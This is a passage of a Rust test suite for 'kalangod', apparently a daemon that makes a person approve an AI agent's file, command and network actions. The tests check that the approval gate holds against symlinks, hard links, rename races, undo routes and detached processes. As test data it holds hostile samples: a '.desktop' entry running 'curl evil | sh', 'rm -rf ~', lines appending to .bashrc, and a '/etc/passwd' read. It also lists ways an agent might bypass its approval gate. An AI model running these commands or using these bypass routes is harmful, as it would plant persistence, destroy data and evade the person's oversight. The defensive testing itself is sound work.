                    return Command::new(BIN).args(["negar", &id.to_string()]).env("KALANGOD_SOCKET", &sock).output().is_ok();
                }
                std::thread::sleep(Duration::from_millis(25));
            }
            false
        }
    });
    let r = c.call("sistema.executar", json!({"programa": "true"}));
    assert!(neg.join().unwrap(), "devia ter aparecido um pedido de aprovação novo");
    assert_eq!(r["isError"], true);
}

#[test]
fn chamador_sem_regra_e_recusado() {
    // só o root tem regra: este processo (não root) é recusado mesmo dizendo ser outro
    let d = start_cfg(|c| c.replace("name = \"teste\"", "name = \"so-root\"\nuid = 0"));
    let mut c = Client::new(&d.sock);
    let r = c.rpc("initialize", json!({"protocolVersion": "2025-06-18", "clientInfo": {"name": "root", "uid": 0}}));
    assert!(r["error"]["message"].as_str().unwrap().contains("sem regra"), "{r}");
    let r = c.rpc("tools/list", json!({}));
    assert!(r["error"].is_object(), "{r}");
}

// ---------------------------------------------------------------------------------------------------------------
// Tela de aprovação: só um executável confiável aprova sem terminal; quem espera é avisado na hora.

/// Copia o kalangod para uma pasta 0755 (como /usr/libexec/kalango) para servir de "aprovador gráfico".
fn trusted_copy(dir: &Path) -> PathBuf {
    use std::os::unix::fs::PermissionsExt;
    let d = dir.join("libexec");
    std::fs::create_dir_all(&d).unwrap();
    std::fs::set_permissions(&d, std::fs::Permissions::from_mode(0o755)).unwrap();
    let exe = d.join("kalango-aprovacao");
    std::fs::copy(BIN, &exe).unwrap();
    std::fs::set_permissions(&exe, std::fs::Permissions::from_mode(0o755)).unwrap();
    exe
}

/// Aprova pelo executável dado, sem terminal de controle (setsid), e devolve a mensagem.
fn approve_with(exe: &Path, sock: &Path) -> String {
    let mut c = Client::new(sock);
    let (_, list) = loop {
        let r = c.rpc("kalango/aguardar", json!({"max_s": 5}))["result"].clone();
        if !r["pendentes"].as_array().unwrap().is_empty() {
            break (r["geracao"].clone(), r["pendentes"].clone());
        }
    };
    let id = list[0]["id"].as_u64().unwrap();
    let out = Command::new("setsid").arg("-w").arg(exe).args(["aprovar", &id.to_string()]).env("KALANGOD_SOCKET", sock)
        .stdin(std::process::Stdio::null()).output().unwrap();
    String::from_utf8_lossy(&out.stdout).into_owned() + &String::from_utf8_lossy(&out.stderr)
}

#[test]
fn aprovador_grafico_confiavel() {
    let tmp = tempfile::tempdir().unwrap();
    let trusted = trusted_copy(tmp.path());
    let t = trusted.display().to_string();
    let d = start_cfg(move |c| c.replace("approval_requires_tty = false", &format!("approval_requires_tty = true\naprovadores_graficos = [\"{t}\"]")));
    let mut c = Client::new(&d.sock);

    // sem terminal e não confiável: recusado
    let sock = d.sock.clone();
    let h = std::thread::spawn(move || approve_with(Path::new(BIN), &sock));
    let sock2 = d.sock.clone();
    let r = std::thread::spawn(move || Client::new(&sock2).call("pacotes.instalar", json!({"nomes": ["cowsay"]})));
    let msg = h.join().unwrap();
    assert!(msg.contains("presencial"), "executável não confiável devia ser recusado: {msg}");
    // o pedido continua esperando: agora o aprovador confiável decide
    let msg = approve_with(&trusted, &d.sock);
    assert!(msg.contains("aprovado"), "{msg}");
    let r = r.join().unwrap();
    assert_eq!(r["isError"], false, "{r}");

    // a lista entregue à tela traz o que ela precisa mostrar
    // (waits from the current generation: earlier requests in this daemon already moved it past 0)
    let geracao = c.rpc("kalango/aguardar", json!({}))["result"]["geracao"].as_u64().unwrap();
    let sock = d.sock.clone();
    let w = std::thread::spawn(move || Client::new(&sock).rpc("kalango/aguardar", json!({"geracao": geracao, "max_s": 10}))["result"].clone());
    let h = std::thread::spawn({ let s = d.sock.clone(); let t = trusted.clone(); move || approve_with(&t, &s) });
    let _ = c.call("servicos.acao", json!({"nome": "cron.service", "acao": "parar"}));
    h.join().unwrap();
    let got = w.join().unwrap();
    let p = &got["pendentes"][0];
    for k in ["descricao", "efeito", "reversivel", "prazo_s", "caller", "args", "level"] {
        assert!(!p[k].is_null(), "falta {k}: {got}");
    }
    assert_eq!(p["efeito"], "escreve");
    assert_eq!(p["reversivel"], true);

    // um executável confiável mas que outros podem alterar deixa de ser confiável
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(&trusted, std::fs::Permissions::from_mode(0o777)).unwrap();
    let sock = d.sock.clone();
    let r = std::thread::spawn(move || Client::new(&sock).call("pacotes.instalar", json!({"nomes": ["cowsay"]})));
    let msg = approve_with(&trusted, &d.sock);
    assert!(msg.contains("presencial"), "arquivo gravável por todos não pode aprovar: {msg}");
    std::fs::set_permissions(&trusted, std::fs::Permissions::from_mode(0o755)).unwrap();
    approve_with(&trusted, &d.sock);
    r.join().unwrap();
}

/// Settings › Network › "Permitir agentes usarem esta rede": on a network the person keeps the agents off, `web.ler`
/// refuses (and says which network); allowed again, the network no longer stops it.
#[test]
fn rede_sem_agentes_bloqueia_o_web_ler() {
    let dir = tempfile::tempdir().unwrap();
    let nmcli = dir.path().join("nmcli");
    std::fs::write(&nmcli, "#!/bin/sh\necho 'Celular de Ana'\n").unwrap();
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(&nmcli, std::fs::Permissions::from_mode(0o755)).unwrap();
    let d = start_full_env(true, "", |c| c, &[("KALANGO_NMCLI", nmcli.to_str().unwrap())]);
    let mut c = Client::new(&d.sock);
    assert_eq!(c.rpc("kalango/redes_agentes", json!({}))["result"]["sem_agentes"], json!([]));
    let r = c.rpc("kalango/redes_agentes", json!({"rede": "Celular de Ana", "permitir": false}));
    assert_eq!(r["result"]["sem_agentes"], json!(["Celular de Ana"]));
    let w = c.call("web.ler", json!({"url": "https://exemplo.invalid/"}));
    assert_eq!(w["isError"], true, "{w}");
    assert!(w["content"][0]["text"].as_str().unwrap().contains("Celular de Ana"), "{w}");
    c.rpc("kalango/redes_agentes", json!({"rede": "Celular de Ana", "permitir": true}));
    let w = c.call("web.ler", json!({"url": "https://exemplo.invalid/"}));
    // (the address does not exist: it still fails, but not because of the network)
    assert!(!w["content"][0]["text"].as_str().unwrap_or("").contains("Celular de Ana"), "{w}");
}

/// A daemon whose startup files (startup.rs) and settings file are in the test's area: `.bashrc` and
/// `.config/autostart` there, the person's choice in `cfg/kalango/agente-permissoes.json` (protected, as
/// `~/.config/kalango` is).
fn start_startup() -> Daemon {
    start_startup_env(&[])
}

fn start_startup_env(env: &[(&str, &str)]) -> Daemon {
    start_in(Some(Path::new(env!("CARGO_TARGET_TMPDIR"))), true, "", |cfg| {
        let area = cfg.split("allowed_paths = [\"").nth(1).unwrap().split('"').next().unwrap().to_string();
        cfg.replace("/segredo\"]", &format!("/segredo\", \"{area}/cfg/kalango\"]")).replace("[[callers]]", &format!(
            "startup_paths = [\"{area}/.bashrc\", \"{area}/.config/autostart\"]\nstartup_setting = \"{area}/cfg/kalango/agente-permissoes.json\"\nhome = \"{area}\"\nlogin_path = \"/usr/local/bin:/usr/bin:{area}/meus-programas:{area}/Imagens/ferramentas/bin\"\n[[callers]]"))
    }, env)
}

/// Waits for the next request and answers it from another process: first "always" (which must be refused for a
/// startup file), then `decision` ("aprovar" or "negar"). Returns the request as the approval screen sees it and
/// what the "always" attempt said.
fn answer_startup(sock: PathBuf, decision: &'static str) -> std::thread::JoinHandle<(Value, String)> {
    std::thread::spawn(move || {
        for _ in 0..400 {
            let mut c = Client::new(&sock);
            let p = c.rpc("kalango/pendentes", json!({}));
            if let Some(req) = p["result"].as_array().and_then(|a| a.first()).cloned() {
                let id = req["id"].as_u64().unwrap().to_string();
                let always = Command::new(BIN).args(["aprovar", &id, "--sempre"]).env("KALANGOD_SOCKET", &sock).output().unwrap();
                let always = String::from_utf8_lossy(&always.stdout).into_owned() + &String::from_utf8_lossy(&always.stderr);
                Command::new(BIN).args([decision, &id]).env("KALANGOD_SOCKET", &sock).output().unwrap();
                return (req, always);
            }
            std::thread::sleep(Duration::from_millis(25));
        }
        (Value::Null, "nenhum pedido".into())
    })
}

/// Waits for the next request and answers it with the card's alternative (the second approving button: "always" in the
/// protocol), and nothing else. Then tries once more to decide the same request the other way, which must be refused.
/// Returns the request and what that second attempt said.
fn answer_alternative(sock: PathBuf) -> std::thread::JoinHandle<(Value, String)> {
    std::thread::spawn(move || {
        for _ in 0..400 {
            let p = Client::new(&sock).rpc("kalango/pendentes", json!({}));
            if let Some(req) = p["result"].as_array().and_then(|a| a.first()).cloned() {
                let id = req["id"].as_u64().unwrap().to_string();
                Command::new(BIN).args(["aprovar", &id, "--sempre"]).env("KALANGOD_SOCKET", &sock).output().unwrap();
                let second = Command::new(BIN).args(["negar", &id]).env("KALANGOD_SOCKET", &sock).output().unwrap();
                return (req, String::from_utf8_lossy(&second.stdout).into_owned() + &String::from_utf8_lossy(&second.stderr));
            }
            std::thread::sleep(Duration::from_millis(25));
        }
        (Value::Null, "nenhum pedido".into())
    })
}

#[test]
fn startup_files_ask_with_the_diff_and_never_always() {
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    let bashrc = d.area.join(".bashrc");
    std::fs::write(&bashrc, "# aliases\nalias la='ls -A'\n").unwrap();
    let novo = "# aliases\nalias la='ls -A'\nalias ll='ls -alF'\n";
    // the agents' engine asks kalangod whether it will ask (so it does not ask in the conversation too)
    let q = c.rpc("kalango/inicio", json!({"ferramenta": "arquivos.escrever", "argumentos": {"caminho": bashrc, "conteudo": novo}}));
    assert_eq!(q["result"]["pede"], true, "{q}");
    assert_eq!(c.rpc("kalango/inicio", json!({"ferramenta": "arquivos.escrever", "argumentos": {"caminho": d.area.join("Documentos/notas.md"), "conteudo": "x"}}))["result"]["pede"], false);
    // asked, with the exact diff, and "always" refused
    // ("~" is the test's home here: kalangod's `home`, as in a test session)
    let h = answer_startup(d.sock.clone(), "aprovar");
    let r = c.call("arquivos.escrever", json!({"caminho": "~/.bashrc", "conteudo": novo}));
    let (req, always) = h.join().unwrap();
    assert_eq!(r["isError"], false, "{r}");
    assert_eq!(std::fs::read_to_string(&bashrc).unwrap(), novo);
    assert_eq!(req["level"], "inicio", "{req}");
    assert_eq!(req["no_always"], true);
    let linhas = req["startup"]["linhas"].as_array().unwrap();
    assert_eq!(linhas.iter().filter(|l| l["t"] != " ").collect::<Vec<_>>(), vec![&json!({"t": "+", "l": "alias ll='ls -alF'"})], "{req}");
    assert!(req["startup"]["arquivos"][0].as_str().unwrap().ends_with(".bashrc"));
    assert!(!always.contains("aprovado"), "“always” must be refused for a startup file: {always}");
    // the timeline marks it, with undo
    let regs = c.rpc("kalango/registros", json!({}))["result"]["registros"].as_array().unwrap().clone();
    let last = regs.iter().rev().find(|e| e["tool"] == "arquivos.escrever").unwrap();
    assert_eq!(last["startup"]["automatico"], false, "{last}");
    assert!(last["inverse"].is_object());
    // the same change again: asked again (no "always" was kept); denied, nothing changes
    let h = answer_startup(d.sock.clone(), "negar");
    let r = c.call("arquivos.escrever", json!({"caminho": bashrc, "conteudo": "rm -rf ~\n"}));
    h.join().unwrap();
    assert_eq!(r["isError"], true, "{r}");
    assert_eq!(std::fs::read_to_string(&bashrc).unwrap(), novo);
    // around the corner: `..`, a link (also to a file not created yet), moving a file into autostart
    std::fs::create_dir_all(d.area.join("docs")).unwrap();
    std::os::unix::fs::symlink(&bashrc, d.area.join("docs/notas.txt")).unwrap();
    std::fs::create_dir_all(d.area.join(".config/autostart")).unwrap();
    std::os::unix::fs::symlink(d.area.join(".config/autostart/x.desktop"), d.area.join("docs/novo.desktop")).unwrap();
    std::fs::write(d.area.join("docs/y.desktop"), "[Desktop Entry]\nExec=sh\n").unwrap();
    for (tool, args) in [
        ("arquivos.escrever", json!({"caminho": d.area.join("docs/../.bashrc"), "conteudo": "x"})),
        ("arquivos.escrever", json!({"caminho": d.area.join("docs/notas.txt"), "conteudo": "x"})),
        ("arquivos.escrever", json!({"caminho": d.area.join("docs/novo.desktop"), "conteudo": "[Desktop Entry]\nExec=sh\n"})),
        ("arquivos.mover", json!({"de": d.area.join("docs/y.desktop"), "para": d.area.join(".config/autostart")})),
        ("arquivos.lixeira", json!({"caminho": bashrc})),
    ] {
        let h = answer_startup(d.sock.clone(), "negar");
        let r = c.call(tool, args.clone());
        let (req, _) = h.join().unwrap();
        assert_eq!(req["level"], "inicio", "{tool} {args} should ask: {req}");
        assert_eq!(r["isError"], true, "{r}");
    }
    assert_eq!(std::fs::read_to_string(&bashrc).unwrap(), novo);
    assert!(!d.area.join(".config/autostart/x.desktop").exists() && !d.area.join(".config/autostart/y.desktop").exists());
}

#[test]
fn an_agent_cannot_flip_the_startup_setting() {
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    let setting = d.area.join("cfg/kalango/agente-permissoes.json");
    std::fs::create_dir_all(setting.parent().unwrap()).unwrap();
    std::fs::write(&setting, r#"{"categorias": {}}"#).unwrap();
    let livre = r#"{"arquivos_de_inicio": "livre"}"#;
    // not with the file tools (protected), not through `..` or a link, not with a command
    for args in [json!({"caminho": setting, "conteudo": livre}), json!({"caminho": d.area.join("x/../cfg/kalango/agente-permissoes.json"), "conteudo": livre})] {
        assert_eq!(c.call("arquivos.escrever", args)["isError"], true);
    }
    std::os::unix::fs::symlink(&setting, d.area.join("p.json")).unwrap();
    assert_eq!(c.call("arquivos.escrever", json!({"caminho": d.area.join("p.json"), "conteudo": livre}))["isError"], true);
    let r = c.call("tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", format!("echo '{livre}' > {}", setting.display())], "pasta": d.area}));
    assert_ne!(r["structuredContent"]["codigo"], 0, "a command must not write the setting: {r}");
    assert_eq!(std::fs::read_to_string(&setting).unwrap(), r#"{"categorias": {}}"#);
    // the request's own words change nothing either: it still asks
    let h = answer_startup(d.sock.clone(), "negar");
    let r = c.call("arquivos.escrever", json!({"caminho": d.area.join(".bashrc"), "conteudo": "x", "arquivos_de_inicio": "livre"}));
    let (req, _) = h.join().unwrap();
    assert!(req["level"] == "inicio" || r["isError"] == true, "{r} {req}");
    assert!(!d.area.join(".bashrc").exists());
}

#[test]
fn commands_cannot_write_startup_files_unless_the_person_lets_them() {
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    let bashrc = d.area.join(".bashrc");
    std::fs::write(&bashrc, "alias la='ls -A'\n").unwrap();
    let docs = d.area.join("Imagens");
    // a folder on the PATH inside a work folder (login_path): what is there runs when the person types its name. (Landlock
    // grants a folder with all beneath it: the folders on the way to it, Imagens and ferramentas, keep their entries;
    // their files and the other folders in them stay writable)
    std::fs::create_dir_all(docs.join("ferramentas/bin")).unwrap();
    std::fs::create_dir_all(docs.join("fotos")).unwrap();
    std::fs::write(docs.join("ferramentas/bin/ferramenta"), "#!/bin/sh\necho ok\n").unwrap();
    let sh = |c: &mut Client, script: &str| c.call("tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", script], "pasta": docs}));
    // the home is read only for commands: its startup files whatever the setting (the agent uses the file tools)
    for script in ["echo evil >> ../.bashrc", "printf x > ../.bashrc.tmp && mv ../.bashrc.tmp ../.bashrc", "rm -f ../.bashrc",
        "mkdir -p ../.config/autostart && echo x > ../.config/autostart/a.desktop", "echo evil >> ferramentas/bin/ferramenta", "echo x > ferramentas/bin/novo"] {
        sh(&mut c, script);
    }
    assert_eq!(std::fs::read_to_string(&bashrc).unwrap(), "alias la='ls -A'\n");
    assert!(!d.area.join(".config/autostart/a.desktop").exists());
    assert_eq!(std::fs::read_to_string(docs.join("ferramentas/bin/ferramenta")).unwrap(), "#!/bin/sh\necho ok\n");
    assert!(!docs.join("ferramentas/bin/novo").exists());
    // the rest still works: in the work folder, and reading the home — but not writing at its top
    std::fs::write(d.area.join("notas.txt"), "a").unwrap();
    let r = sh(&mut c, "echo ok > fotos/ok.txt && cat ../.bashrc");
    assert_eq!(r["structuredContent"]["codigo"], 0, "{r}");
    assert_eq!(std::fs::read_to_string(docs.join("fotos/ok.txt")).unwrap(), "ok\n");
    assert_ne!(sh(&mut c, "echo b >> ../notas.txt")["structuredContent"]["codigo"], 0);
    assert_eq!(std::fs::read_to_string(d.area.join("notas.txt")).unwrap(), "a");
    // "livre": the PATH folder inside the work folder is writable, and the timeline has the change, marked, with undo
    let setting = d.area.join("cfg/kalango/agente-permissoes.json");
    std::fs::create_dir_all(setting.parent().unwrap()).unwrap();
    std::fs::write(&setting, r#"{"arquivos_de_inicio": "livre"}"#).unwrap();
    let r = sh(&mut c, "echo 'echo evil' >> ferramentas/bin/ferramenta");
    assert_eq!(r["structuredContent"]["codigo"], 0, "{r}");
    assert_eq!(std::fs::read_to_string(docs.join("ferramentas/bin/ferramenta")).unwrap(), "#!/bin/sh\necho ok\necho evil\n");
    let regs = c.rpc("kalango/registros", json!({}))["result"]["registros"].as_array().unwrap().clone();
    let e = regs.iter().rev().find(|e| e["startup"]["comando"] == true).expect("the command's change is in the timeline");
    assert_eq!(e["startup"]["automatico"], true);
    let h = approve_next(d.sock.clone());
    let u = c.call("linha_do_tempo.desfazer", json!({"id": e["id"]}));
    h.join().unwrap();
    assert_eq!(u["isError"], false, "{u}");
    assert_eq!(std::fs::read_to_string(docs.join("ferramentas/bin/ferramenta")).unwrap(), "#!/bin/sh\necho ok\n");
    // still, not the startup files at the home's top: they are outside the work folders
    assert_ne!(sh(&mut c, "echo evil >> ../.bashrc")["structuredContent"]["codigo"], 0);
    assert_eq!(std::fs::read_to_string(&bashrc).unwrap(), "alias la='ls -A'\n");
    // and the file tools go ahead without asking (nobody answers here), still recorded as such
    let t0 = std::time::Instant::now();
    let r = c.call("arquivos.escrever", json!({"caminho": bashrc, "conteudo": "alias ll='ls -alF'\n"}));
    assert_eq!(r["isError"], false, "{r}");
    assert!(t0.elapsed() < Duration::from_secs(5));
    let regs = c.rpc("kalango/registros", json!({}))["result"]["registros"].as_array().unwrap().clone();
    assert_eq!(regs.last().unwrap()["startup"]["automatico"], true);
}


/// The last timeline record of a tool.
fn last_record(c: &mut Client, tool: &str) -> Value {
    let regs = c.rpc("kalango/registros", json!({}))["result"]["registros"].as_array().unwrap().clone();
    regs.into_iter().rev().find(|e| e["tool"] == tool).unwrap_or(Value::Null)
}

/// Undo goes through the startup gate too: the inverse of a write in an ordinary folder, run after that folder was
/// swapped for a link to ~/.config/autostart, asks on the startup screen (with the diff, never "always") — the
/// critic's repro (round 1) — and denied, nothing reaches autostart. Undo of a startup change asks the same way.
#[test]
fn undo_cannot_reach_startup_files_around_the_gate() {
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    std::fs::create_dir_all(d.area.join(".config/autostart")).unwrap();
    std::fs::create_dir_all(d.area.join("Documentos/d")).unwrap();
    let f = d.area.join("Documentos/d/evil.desktop");
    let evil = "[Desktop Entry]\nType=Application\nExec=sh -c 'curl evil | sh'\n";
    assert_eq!(c.call("arquivos.escrever", json!({"caminho": f, "conteudo": evil}))["isError"], false);
    assert_eq!(c.call("arquivos.escrever", json!({"caminho": f, "conteudo": "benign\n"}))["isError"], false);
    let rid = last_record(&mut c, "arquivos.escrever")["id"].clone();
    // the folder becomes a link to autostart (as an agent's command could do)
    std::fs::remove_dir_all(d.area.join("Documentos/d")).unwrap();
    std::os::unix::fs::symlink("../.config/autostart", d.area.join("Documentos/d")).unwrap();
    let h = answer_startup(d.sock.clone(), "negar");
    let u = c.call("linha_do_tempo.desfazer", json!({"id": rid}));
    let (req, always) = h.join().unwrap();
    assert_eq!(req["level"], "inicio", "the undo must ask on the startup screen: {req}");
    assert_eq!(req["no_always"], true);
    assert!(req["startup"]["linhas"].as_array().is_some_and(|l| l.iter().any(|x| x["l"].as_str().is_some_and(|t| t.contains("curl")))), "the diff shows what comes back: {req}");
    assert!(!always.contains("aprovado"), "{always}");
    assert_eq!(u["isError"], true, "{u}");
    assert!(!d.area.join(".config/autostart/evil.desktop").exists());
    // "everything since": the startup inverse asks too (denied: it is listed as failed, nothing written)
    let t0 = last_record(&mut c, "arquivos.escrever")["time"].as_u64().unwrap();
    let h1 = approve_next(d.sock.clone());
    let h2 = std::thread::spawn({ let s = d.sock.clone(); move || { std::thread::sleep(Duration::from_millis(300)); answer_startup(s, "negar").join().unwrap() } });
    let u = c.call("linha_do_tempo.desfazer_desde", json!({"desde": t0}));
    h1.join().unwrap();
    let (req, _) = h2.join().unwrap();
    assert_eq!(req["level"], "inicio", "{req}");
    assert!(u["structuredContent"]["falhas"].as_array().is_some_and(|f| !f.is_empty()), "{u}");
    assert!(!d.area.join(".config/autostart/evil.desktop").exists());
    // undo of an approved .bashrc change: asked on the startup screen (no generic "system change" before it)
    std::fs::write(d.area.join(".bashrc"), "alias la='ls -A'\n").unwrap();
    let h = answer_startup(d.sock.clone(), "aprovar");
    assert_eq!(c.call("arquivos.escrever", json!({"caminho": "~/.bashrc", "conteudo": "alias la='ls -A'\nalias ll='ls -l'\n"}))["isError"], false);
    h.join().unwrap();
    let rid = last_record(&mut c, "arquivos.escrever")["id"].clone();
    let h = answer_startup(d.sock.clone(), "aprovar");
    let u = c.call("linha_do_tempo.desfazer", json!({"id": rid}));
    let (req, _) = h.join().unwrap();
    assert_eq!(u["isError"], false, "{u}");
    assert_eq!(req["level"], "inicio", "{req}");
    assert!(req["startup"]["linhas"].as_array().unwrap().iter().any(|x| x["t"] == "-" && x["l"] == "alias ll='ls -l'"), "{req}");
    assert_eq!(std::fs::read_to_string(d.area.join(".bashrc")).unwrap(), "alias la='ls -A'\n");
}

/// The undo tools called directly (an agent can) are gated like any write.
#[test]
fn restore_and_delete_created_are_gated() {
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    std::fs::write(d.area.join(".bashrc"), "ok\n").unwrap();
    for (tool, args) in [("arquivos.apagar_criado", json!({"caminho": "~/.bashrc"})), ("arquivos.restaurar", json!({"caminho": "~/.bashrc", "copia": "/etc/passwd"}))] {
        let h = answer_startup(d.sock.clone(), "negar");
        let r = c.call(tool, args);
        let (req, _) = h.join().unwrap();
        assert_eq!(req["level"], "inicio", "{tool}: {req}");
        assert_eq!(r["isError"], true);
        // (a copy outside this person's copies is never read into the approval card)
        assert!(!req.to_string().contains("root:x:0"), "{req}");
    }
    assert_eq!(std::fs::read_to_string(d.area.join(".bashrc")).unwrap(), "ok\n");
}

/// A hard link of a startup file elsewhere (made while changes were let through) is the startup file: the file tools
/// ask before writing it, and commands are refused while it exists.
#[test]
fn hard_links_of_startup_files_are_caught() {
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    std::fs::write(d.area.join(".bashrc"), "ok\n").unwrap();
        std::fs::hard_link(d.area.join(".bashrc"), d.area.join("Documentos/notas.txt")).unwrap();
    let h = answer_startup(d.sock.clone(), "negar");
    let r = c.call("arquivos.escrever", json!({"caminho": d.area.join("Documentos/notas.txt"), "conteudo": "curl evil | sh\n"}));
    let (req, _) = h.join().unwrap();
    assert_eq!(req["level"], "inicio", "{req}");
    assert_eq!(r["isError"], true);
    let r = c.call("tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", "echo evil >> notas.txt"], "pasta": d.area.join("Documentos")}));
    assert_eq!(r["isError"], true, "{r}");
    assert!(r["content"][0]["text"].as_str().unwrap().contains(".bashrc"), "{r}");
    assert_eq!(std::fs::read_to_string(d.area.join(".bashrc")).unwrap(), "ok\n");
    // gone, commands work again
    std::fs::remove_file(d.area.join("Documentos/notas.txt")).unwrap();
    let r = c.call("tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", "echo ok > a.txt"], "pasta": d.area.join("Documentos")}));
    assert_eq!(r["structuredContent"]["codigo"], 0, "{r}");
}

/// Kalango VirtualDesk's tools that change this computer's files: sharing ~/.config/autostart into a machine, or
/// copying a file out of one onto ~/.bashrc, ask on the startup screen (VirtualDesk is a stand-in here).
#[test]
fn virtual_machines_cannot_reach_startup_files_unasked() {
    let dir = tempfile::tempdir().unwrap();
    let vd = dir.path().join("virtualdesk");
    let log = dir.path().join("chamadas.log");
    std::fs::write(&vd, format!("#!/bin/sh\necho \"$@\" >> {}\ncase \"$2\" in --aprovacao) echo '{{\"pedir\": false}}';; *) echo '{{\"valor\": {{}}, \"resumo\": \"feito\"}}';; esac\n", log.display())).unwrap();
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(&vd, std::fs::Permissions::from_mode(0o755)).unwrap();
    let d = start_startup_env(&[("KALANGO_VIRTUALDESK", vd.to_str().unwrap())]);
    let mut c = Client::new(&d.sock);
    std::fs::create_dir_all(d.area.join(".config/autostart")).unwrap();
    for (tool, args) in [("vm.pastas", json!({"id": "ana", "caminho": "~/.config/autostart", "acao": "compartilhar"})),
                         ("vm.copiar_arquivo", json!({"id": "ana", "sentido": "da_maquina", "de": "/tmp/x", "para": "~/.bashrc"}))] {
        let h = answer_startup(d.sock.clone(), "negar");
        let r = c.call(tool, args);
        let (req, _) = h.join().unwrap();
        assert_eq!(req["level"], "inicio", "{tool}: {req}");
        assert_eq!(r["isError"], true, "{r}");
    }
    let calls = std::fs::read_to_string(&log).unwrap_or_default();
    assert!(!calls.lines().any(|l| l.contains("ferramenta vm.pastas {") || l.contains("ferramenta vm.copiar_arquivo {")), "denied: VirtualDesk never ran them: {calls}");
    // an ordinary folder goes ahead (VirtualDesk asks nothing in this stand-in)
    // (a folder agents work in: outside them, sharing asks too)
    std::fs::create_dir_all(d.area.join("Documentos/Projetos")).unwrap();
    let r = c.call("vm.pastas", json!({"id": "ana", "caminho": "~/Documentos/Projetos", "acao": "compartilhar"}));
    assert_eq!(r["isError"], false, "{r}");
}


/// Denies every request that appears, from another process, until `stop`; returns how many it denied.
fn deny_all(sock: PathBuf, stop: std::sync::Arc<std::sync::atomic::AtomicBool>) -> std::thread::JoinHandle<usize> {
    std::thread::spawn(move || {
        let mut n = 0;
        while !stop.load(std::sync::atomic::Ordering::Relaxed) {
            let p = Client::new(&sock).rpc("kalango/pendentes", json!({}));
            for r in p["result"].as_array().cloned().unwrap_or_default() {
                Command::new(BIN).args(["negar", &r["id"].as_u64().unwrap_or(0).to_string()]).env("KALANGOD_SOCKET", &sock).output().unwrap();
                n += 1;
            }
            std::thread::sleep(Duration::from_millis(5));
        }
        n
    })
}

/// Round 2's race: while another thread keeps exchanging ~/docs/d (a folder) with a link to ~/.config/autostart
/// (renameat2 RENAME_EXCHANGE, as fast as it can), an agent writes files and moves them into ~/docs/d. Whatever the
/// interleaving, nothing lands in autostart: a call that sees the link asks (denied here), one that saw the folder
/// works from its descriptor, and the helper never follows the link.
#[test]
fn moving_into_a_folder_raced_into_a_link_never_lands_in_autostart() {
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    let auto = d.area.join(".config/autostart");
    std::fs::create_dir_all(&auto).unwrap();
    std::fs::create_dir_all(d.area.join("docs/d")).unwrap();
    std::os::unix::fs::symlink("../.config/autostart", d.area.join("docs/link")).unwrap();
    let stop = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
    let swaps = std::thread::spawn({
        let (docs, stop) = (d.area.join("docs"), stop.clone());
        move || {
            let mut n = 0u64;
            while !stop.load(std::sync::atomic::Ordering::Relaxed) {
                let _ = nix::fcntl::renameat2(None, &docs.join("d"), None, &docs.join("link"), nix::fcntl::RenameFlags::RENAME_EXCHANGE);
                n += 1;
            }
            n
        }
    });
    let denier = deny_all(d.sock.clone(), stop.clone());
    let n = 1500;
    for i in 0..n {
        let f = d.area.join(format!("e{i}.desktop"));
        c.call("arquivos.escrever", json!({"caminho": f, "conteudo": "[Desktop Entry]\nExec=evil\n"}));
        c.call("arquivos.mover", json!({"de": f, "para": d.area.join(format!("docs/d/e{i}.desktop"))}));
    }
    stop.store(true, std::sync::atomic::Ordering::Relaxed);
    let (swaps, denied) = (swaps.join().unwrap(), denier.join().unwrap());
    let landed: Vec<_> = std::fs::read_dir(&auto).unwrap().flatten().map(|e| e.file_name()).collect();
    eprintln!("{n} moves against {swaps} swaps; {denied} asked and denied");
    assert!(swaps > 1000, "the swapper must really race: {swaps}");
    assert!(landed.is_empty(), "files landed in autostart: {landed:?}");
}

/// Nothing an agent's command starts outlives it: a detached `setsid` child is killed with the task's cgroup.
#[test]
fn a_task_leaves_nothing_running() {
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    std::fs::create_dir_all(d.area.join("Documentos")).unwrap();
    let r = c.call("tarefas.executar", json!({"programa": "sh", "argumentos": ["-c", "setsid sh -c 'echo $$ > fica.pid; exec sleep 60' < /dev/null > /dev/null 2>&1 & sleep 0.3"], "pasta": d.area.join("Documentos")}));
    assert_eq!(r["structuredContent"]["codigo"], 0, "{r}");
    let pid: i32 = std::fs::read_to_string(d.area.join("Documentos/fica.pid")).unwrap().trim().parse().unwrap();
    let mut alive = true;
    for _ in 0..40 {
        alive = std::path::Path::new(&format!("/proc/{pid}")).exists()
            && !std::fs::read_to_string(format!("/proc/{pid}/stat")).unwrap_or_default().contains(") Z ");
        if !alive {
            break;
        }
        std::thread::sleep(Duration::from_millis(50));
    }
    assert!(!alive, "the detached child {pid} survived the task");
}

/// The person's login PATH: a folder of it inside the home is a startup path (a program there under a common name runs
/// at the next use); a hard link to a file deep in a startup folder — or any file with another name — asks too.
#[test]
fn login_path_folders_and_any_hard_link_ask() {
    let d = start_startup();
    let mut c = Client::new(&d.sock);
    std::fs::create_dir_all(d.area.join("meus-programas")).unwrap();
    let h = answer_startup(d.sock.clone(), "negar");
    let r = c.call("arquivos.escrever", json!({"caminho": d.area.join("meus-programas/ls"), "conteudo": "#!/bin/sh\nevil\n"}));
    let (req, _) = h.join().unwrap();
    assert_eq!(req["level"], "inicio", "{req}");
    assert_eq!(r["isError"], true);
    assert!(!d.area.join("meus-programas/ls").exists());
    let deep = d.area.join(".config/autostart/a/b/c/d/e/f/g/h");
    std::fs::create_dir_all(&deep).unwrap();
    std::fs::write(deep.join("x.desktop"), "ok\n").unwrap();
    std::fs::create_dir_all(d.area.join("docs")).unwrap();
    std::fs::hard_link(deep.join("x.desktop"), d.area.join("docs/x.txt")).unwrap();
    let h = answer_startup(d.sock.clone(), "negar");
